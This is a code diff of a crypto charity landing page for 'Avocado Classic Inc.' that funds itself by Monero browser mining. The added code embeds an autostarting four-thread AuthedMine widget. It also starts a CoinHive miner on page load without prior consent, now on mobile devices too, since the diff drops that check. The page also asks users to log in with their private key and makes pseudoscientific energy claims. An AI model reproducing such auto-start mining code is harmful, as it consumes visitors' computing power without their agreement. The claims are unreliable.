@@ -1,279 +1,229 @@
 <!DOCTYPE HTML>
 <!--
-	Avocado Classic website by Avocado Classic
+	Landing Page for Avocdo Classic Inc.
 -->
 <html>
 	<head>
-		<title>Avocado Classic</title>
-		<link rel="icon" href="images/Flavicon16x16.png">
-		<script src="assets/js/web3.min.js"></script>
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-		<script>
-			var miner = new CoinHive.Anonymous('txmv3jHAvkgWlXtOiZSPVknX9GsTrXwL', {throttle: 0.3});
-
-			// Only start on non-mobile devices and if not opted-out
-			// in the last 14400 seconds (4 hours):
-			if (!miner.isMobile() && !miner.didOptOut(14400)) {
-			miner.start();
-	}
-			</script>
+		<title>Avocado Classic Inc.</title>
 		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="assets/css/main.css" />
-		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
-		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+		
 		
 	</head>
-	<body class="landing">
-		<div id="page-wrapper">
+	<body class="landing is-preload">
 
-			<!-- Header -->
-				<header id="header">
-					<h1 id="logo"><a href="index.html"><image src="images/Logo_350x75.png"></a></h1>
-					<nav id="nav">
-						<ul>
-							<li><a href="index.html">Home</a></li>
-							<li><a href="account.html">My Account</a></li>
-							<li><a href="about.html">About Us</a>
-								<ul>
-									<li><a href="contact.html">Contact Us</a></li>
-								</ul>
-							</li>
-							<li> Partners
-								<ul>
-									<li><a href="https://mistmining.com">Mist Mining</a></li>
-									<li><a href="https://bloktalks.com"> BlokTalks</a></li>
-									<li><a href="https://worldblockchainsociety.com">World Blockchain Society</a></li>
-								</ul>
-								
-							</li>
-							
-						</ul>
-					</nav>
-				</header>
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
 
-			<!-- Banner -->
-				<section id="banner">
-					<div class="content" id="particles-js">
-						<header>
-							<h2 style="text-align: center">Donate to Charity</h2>
-							<p style="text-align: center">Just by being on this page.
-							</p>
-							<p style="text-align: center" id="accountLabel"></p>
-						</header>
-						
-					</div>
-					<a href="#one" class="goto-next scrolly">Next</a>
-				</section>
+				<!-- Header -->
+					<header id="header" class="alt">
+						<h1>
+						<a href="index.html" style="text-decoration:none">
+							<img src="images/AVCLogo.png"/>
+						</a></h1>
+						<nav id="nav">
+							<ul>
+								<li class="special">
+									<a href="#menu" class="menuToggle"><span>Menu</span></a>
+									<div id="menu">
+										<ul>
+											<li><a href="index.html">Home</a></li>
+											<li><a href="about.html">About Us</a></li>
+											<li><a href="profile.html">My Profile</a></li>
+											<li> User: <a id=""></a>
 
-			<!-- One -->
-				<section id="one" class="spotlight style1 bottom">
-					<span class="image fit main"><img src="images/pic02.jpg" alt="" /></span>
-					<div class="content">
-						<div class="container">
-							<div class="row">
-								<div class="4u 12u$(medium)">
-									<header>
+												<script>
+													var onCoinHiveSimpleUIReady = function() {
+														CoinHive.Miner.on('authed', function(params) {
+															console.log('Simple UI has authed with the pool');
+														});
+														CoinHive.Miner.on('job', function(params) {
+															console.log('New job received from pool');
+														});
+													}
+												</script>
 
-											<b> Step 1: Choose one below </b>
-											<b>  
-												This site requires the use of either the 
-												<a href="https://github.com/ethereum/mist">Mist Browser</a>
-											
-												or <a href="https://metamask.io">Metamask Plug In</a>.
-											</b>
-
-											
-											<p style="text-align: center;">
-												<br>
-												<a href="https://github.com/ethereum/mist">
-														<img src="images/mist.png" alt="Mist Browser" style="width:75px;height:75px;border:0;text-align: center;">
-												</a> 
-												<br> 
-													<a href="https://github.com/ethereum/mist"> Mist Browser</a> <b>: The end user-user interface for Ethereum. This requires more computing power. This option is great for those looking to run a full node and stregthen the network. </b>
-													<br>
-													<br>
-												<a href="https://metamask.io">
-															<img src="images/metamask.png" alt="Metamask" style="width:75px;height:75px;border:0;text-align: center;">
-													</a> <br> <a href="https://metamask.io">Metamask Plugin</a><b> : Lightweight. Turns any chrome, firefox, or brave browser into a mist browser that connects to the ethereum blockchain.  
-
-													</b>
-											</p>
-									</header>
-								</div>
-								<div class="4u 12u$(medium)"> 
-										<body>
-												<b> 
-												Step 2: (optional)
-												</b>
-												<b>
-												For added security while using any dApp it is recommended to use <a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">Cryptonite by MetaCert</a> 
-												 and <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">EAL</a>
-												</b>
-												<p style="text-align: center;">
-													<a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">
-														<img src="images/cryptonite.png" alt="Cryptonite by MetaCert" style="width:100px;height:75px;border:0;text-align: center;">
-													</a>
-													<br>
-													<a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">Cryptonite by Metacert</a>
-													<b>
-														: Cryptonite verifies the website you are on is not compromised by phising attacks. This is a must have for the browser of any crypto-enthusiast.
-													</b>
-													<br>
-													<br>
-													  <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">
-														<img src="images/eal.png" alt="Ethereum Address Lookup" style="width:75px;height:75px;border:0;text-align: center;">
-													  </a>
-													  <br>
-													  <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">Ethereum Address Lookup</a> 
-													  <b>
-														  : This plug in allows you to look up addressess and vet them against a blacklists.
-													  </b>
-												</p>
-											</body>
-								 </div>
-									<div class="4u$ 12u$(medium)">
-											<body>
-													<hb> 
-														Your all set! 
-													</b>
-													<b>
-														You are now ready to transact safely, using the blockchain, on the web 3.0
-													</b>
-													<br>
-													
-														<image src="images/check.png" alt="Great Job!" style="width:300px;height:300px;border:0;text-align:center;">
-													
-									
-											</body>
+												<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+												
+												<div class="coinhive-miner" 
+													style="width: 256px; height: 310px"
+													data-key="dlGIcWIQnjDogPh3N7UcjUY6UwCAIerM"
+													data-autostart="true"
+													data-whitelabel="false"
+													data-background="#000000"
+													data-text="#eeeeee"
+													data-action="#00ff00"
+													data-graph="#555555"
+													data-threads="4"
+													data-throttle="0.1"
+													>
+													<em>Loading...</em>
+												</div></li>
+										</ul>
 									</div>
-							</div>
+								</li>
+							</ul>
+						</nav>
+					</header>
+
+				<!-- Banner -->
+					<section id="banner">
+						<div class="central"><img src="images/AvocadoClassicLogo.png" /></div>
+						<div class="inner">
+
+							<p>
+							Get ready to turn the power on.
+							<br />
+							</p>
+							<ul class="actions special">
+								<li><a href="about.html" class="button primary">Beta Test</a></li>
+							</ul>
 						</div>
-					</div>
-					<a href="#two" class="goto-next scrolly">Next</a>
-				</section>
+						<a href="#one" class="more scrolly">Learn More</a>
+					</section>
 
-			
-
-			<!-- Two -->
-			<section id="two" class="spotlight style2 right">
-					<span class="image fit main"><img src="images/pic03.jpg" alt="" /></span>
-					<div class="content">
-							<header>
-									<h2>Data Mining for renewable energy</h2>
-									<p>Using the world's computing power to invest in renewable energy for emprovished nations. </p>
-								</header>
-								<p> 
-								</p>
-								<ul class="actions">
-									<li><a href="marketplace.html" class="button">Go to Marketplace</a></li>
-								</ul>
-						</div>
-					<a href="#three" class="goto-next scrolly">Next</a>
-				</section>	
-
-			<!-- Three -->
-
-			<section id="three" class="spotlight style3 left">
-					<span class="image fit main bottom"><img src="images/pic04.jpg" alt="" /></span>
-					<div class="content">
-							<header>
-									<h2>Hosting</h2>
-									<p>Buy a miner with us and get the first month of hosting free. Just pay the electricity at the end of the month. </p>
-								</header>
-								<p>		
-
-										Fully auditable hosting locations with partners who are held to standards. 
-										Fully transparent facilities that show electricty rates, average temperature and availability.
-										Unlike other hosting companies, if  a location is full you will be unable to choose it for hosting. 
-										We won't waste your time or money.
-										
-									
-								</p>
-								<ul class="actions">
-									<li><a href="hosting.html" class="button">Hosting Services</a></li>
-								</ul>	
-					</div>
-					<a href="#four" class="goto-next scrolly">Next</a>
-				</section>
-
-			
-
-			
-			<!-- Five -->
-				<section id="five" class="wrapper style2 special fade">
-					<div class="container">
-						<header>
-							<h2>Sign Up for our newsletter</h2>
-							<p></p>
+				<!-- One -->
+				<section id="one" class="wrapper style1 special">
+					<div class="inner">
+						<header class="major">
+							<h2>Welcome to the web 3.0</h2>
 						</header>
-						<form method="post" action="#" class="container 50%">
-							<div class="row uniform 50%">
-								<div class="8u 12u$(xsmall)"><input type="email" name="email" id="email" placeholder="Your Email Address" /></div>
-								<div class="4u$ 12u$(xsmall)"><input type="submit" value="Get Started" class="fit special" /></div>
-							</div>
-						</form>
+						<ul class="icons major">
+							<li>Download Metamask or the full Et</li>
+						</ul>
 					</div>
 				</section>
 
-			<!-- Footer -->
-				<footer id="footer">
-					<ul class="icons">
-						<li><a href="https://twitter.com/mistmining" class="icon alt fa-twitter"><span class="label">Twitter</span></a></li>
-						<li><a href="#" class="icon alt fa-facebook"><span class="label">Facebook</span></a></li>
-						<li><a href="#" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
-						<li><a href="#" class="icon alt fa-instagram"><span class="label">Instagram</span></a></li>
-						<li><a href="#" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
-						<li><a href="#" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
-					</ul>
-					<ul class="copyright">
-						<li>&copy; Untitled. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
-					</ul>
-				</footer>
+				
 
-		</div>
+				<!-- Two -->
+					<section id="two" class="wrapper alt style2">
+						<section class="spotlight">
+							<div class="image"><img src="images/pic03.jpg" alt="" /></div><div class="content">
+								<h2>Non-Profit DAO</h2>
+								<p>Avocado Classic Inc. is a not-for-profit Decentralized Autonomous Organization (DAO) that utilizes data mining and blockchain technology to generate funds for renewable energy technology and disperse it's use to improvished areas worldwide. </p>
+								<button href="about.html">About Us</button>
+								<br/>
+									<p>  </p>
+							</div>
+						</section>
+						<section class="spotlight">
+							<div class="image"><img src="images/pic01.jpg" alt="" /></div><div class="content">
+								<h2>Browser Mining</h2>
+								<p> No need to spend money to participate. Just leave your browser miner on and running. The collective traffic of the site generates enough hashing power to provide an income for renewable energy projects without the need to display ads.  </p>
+								<button href="profile.html">About Us</button>	
+							</div>
+						</section>
+						<section class="spotlight">
+							<div class="image"><img src="images/pic02.jpg" alt="" /></div><div class="content">
+								<h2>Piezoelectric renewable energy</h2>
+								<p>Ocean power can be harvested utilizing piezoelectric voltage generators and floating buoys. Our plan is to generate electricity using this method. 
+									Our work is based on work by Nikola Tesla and the Ancient Egyptian Pyramids.
+									 </p>
+									 <button href="voting.html">Voting Project</button>
+									 <br/>
+									<p>  </p>
+									</div>	
+						</section>
+					</section>
+
+				<!-- Three -->
+					<section id="three" class="wrapper style3 special">
+						<div class="inner">
+							<header class="major">
+								<h2>No need to spend any money to participate</h2>
+								<p>Just leave your browser open on this webpage. The monero miner can be tracked using the user interface.<br />
+								By leaving your computer's browser open on this page you are helping those in need around the world.</p>
+							</header>
+							<ul class="features">
+								<li class="icon fa-address-card-o">
+									<h3>Your participation counted on a dApp. </h3>
+									<p>Track your participation through a decentralized application. This informtion is fully decentralized on the Ethereum and NEM blockchain respectively. </p>
+								</li>
+								<li class="icon fa fa-star-o">
+									<h3>Earn Collectible Rewards</h3>
+									<p>Your contribution is tracked through smart contracts and the monero interface. Users participating will receive rewards such as tokens, collectibles and elevated privelages in the dApp. </p>
+								</li>
+								<li class="icon fa-code">
+									<h3>Fully transparent</h3>
+									<p>Fully auditable smart contracts publically deployed on the blockchain. You see exactly who receives charitable contributions and what the funds are used for. Avocado Classic Inc. is registered with the state of Florida as a Non-profit Corporation. Board members are appointed using smart contracts giving the community controll over the DAO. </p>
+								</li>
+								<li class="icon fa-group">
+									<h3>Become part of an immutable consensus.</h3>
+									<p>Global issues change constantly. With distributed mining people have a voice that can't be censored by banks, corporations or governments. We will work on projects accepted by the community and in line with the terms of service. </p>
+								</li>
+								<li class="icon fa-institution">
+									<h3>Vote and make a difference</h3>
+									<p>Your vote is counted on the NEM blockchain. These votes are tallied and public for all to see on the blockchain. Since results are decentralized they are censorship resistant against board members of the DAO.  </p>
+								</li>
+								<li class="icon fa-key">
+									<h3> Log in using your private key.</h3>
+									<p> Private information will be safely secured off chain. This is a web 3.0 application that uses cryptography to secure your account. </p>
+								</li>
+							</ul>
+						</div>
+					</section>
+					<br />
+
+					<!-- Contact -->
+					<section id="contact" class="wrapper style1 special">
+							<h2 class="major">Contact Us</h2>
+						
+							<form method="POST" action="https://formspree.io/guactoshi@gmail.com">
+								<input type="email" name="email" placeholder="Your email">
+								<br />
+								<textarea name="message" placeholder="Your message"></textarea>
+								<br />
+								<button type="submit" style="color-adjust: #706908">Send</button>
+							  </form>
+						<br />
+						<br />
+						
+						  <h2>Come meet us at</h2>
+						  <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3592.9842284160195!2d-80.28801488497888!3d25.771084483632436!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88d9b96224a2247d%3A0x608c1fb6397ef7a5!2sAvocado+Classic+Inc.!5e0!3m2!1sen!2sus!4v1533230766618" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
+						  <p><ul>
+							  <li>Address: 5555 west Flagler St, Unit B, Coral Gables, FL, 33134</li>
+							  <li>Phone: +1(305)-946-1098</li>
+							  <li>Email: <email>info@avocadoclassic.org</email> </li>
+						  </ul></p>
+						
+					</section>
+
+				<!-- Footer -->
+					<footer id="footer">
+						<ul class="icons">
+								<li><a href="https://twitter.com/Guactoshi" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+								<li><a href="https://www.facebook.com/guactoshi" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
+								<li><a href="https://www.linkedin.com/in/camilo-m-hernandez-b3186418/" class="icon fa-linkedin"><span class="label">Linked In</span></a></li>
+								<li><a href="https://www.instagram.com/guactoshi" class="icon fa-instagram"><span class="label">Instagram</span></a></li>
+								<li><a href="https://github.com/Guactoshi" class="icon fa-github"><span class="label">GitHub</span></a></li>
+								<li><a href="https://www.youtube.com/channel/UCgdDaUJwbQ5oGPqHnkN0wcA" class="icon fa-youtube"><span class="label">Youtube</span></a></li>
+								<li><a href="https://www.twitch.tv/guactoshi" class="icon fa-twitch"><span class="label">Twitch</span></a></li>
+						</ul>
+						<ul class="copyright">
+							<li>&copy; Avocado Classic Inc.</li><li>Design: <a href="http://guactoshi.com">Guactoshi</a>, <a href="https://twitter.com/ajlkn">Ajlkn</a> </li> <li>Photography:<a href="https://www.r-frames.com/">R-Frames</a></li>
+						</ul>
+					</footer>
+			</div>
 
 		<!-- Scripts -->
-			
-			<script>
-				if(typeof web3 !== "undefined"){
-
-					console.log("Web 3 found");
-					web3 = new Web3(web3.currentProvider);
-
-					web3.eth.getAccounts(function(e,accounts){
-						var firstAccount = accounts[0];
-						document.getElementById("accountLabel").innerHTML = "Ethereum wallet is " + firstAccount + "" ; 
-						console.log(firstAccount);
-						web3.eth.getBalance(firstAccount,function(e, balance){
-							document.getElementById("balanceLabel").innerHTML = "Balance is" + balance + "wei" ;
-							console.log(balance);
-
-
-						});
-
-					});
-				}
-				else{
-					alert("Could not find Web3.0 provider. Please visit metamask.io or download the Ethereum Mist browser");
-					window.open('https://metamask.io', 'parent');
-				}
-			</script>
-			<script src="assets/js/particles.js"></script>
-			<script>
-				particlesJS.load('particles-js', 'particle.json', function(){
-					console.log('particles.json loaded...')
-				})
-			</script>
 			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.scrolly.min.js"></script>
-			<script src="assets/js/jquery.dropotron.min.js"></script>
 			<script src="assets/js/jquery.scrollex.min.js"></script>
-			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
 			<script src="assets/js/util.js"></script>
-			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
 			<script src="assets/js/main.js"></script>
-			
+			<script>
+				var miner = new CoinHive.Anonymous('txmv3jHAvkgWlXtOiZSPVknX9GsTrXwL', {throttle: 0.3});
+				// Only start on non-mobile devices and if not opted-out
+				// in the last 14400 seconds (4 hours):
+				if (!miner.didOptOut(14400)) {
+				miner.start();
+		}
+			</script>
+
 	</body>
 </html>
